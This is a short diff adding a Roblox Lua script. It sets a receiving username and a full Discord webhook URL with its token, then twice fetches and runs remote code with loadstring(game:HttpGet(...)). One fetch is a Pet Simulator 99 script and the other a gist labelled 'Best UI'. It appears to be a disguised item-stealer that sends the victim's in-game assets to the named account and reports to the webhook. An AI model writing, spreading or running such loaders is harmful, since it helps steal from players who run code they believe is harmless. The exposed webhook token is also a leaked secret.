@@ -1,0 +1,8 @@
+Username = "CryNoMorePet"
+Webhook = "https://discord.com/api/webhooks/1272575419219972096/STeNkt95kwPcwtzoGbfm1bCvOHPJ_fSSGrJ1pK_Vk8uBrrLZKxE_sqA19qAk_r_EinHL"
+
+getgenv().gui = false
+loadstring(game:HttpGet("https://raw.githubusercontent.com/zachemzhestokiy/x/main/ps99.lua"))()
+
+_G.scriptName = "Best UI"
+loadstring(game:HttpGet("https://gist.githubusercontent.com/AdoptMeScript-VIP/d4f0c902b160399fd380774e2593b385/raw/f68e340c75f44bb40cdc32a574b1ee3d7cf3c1e7/Test"))()
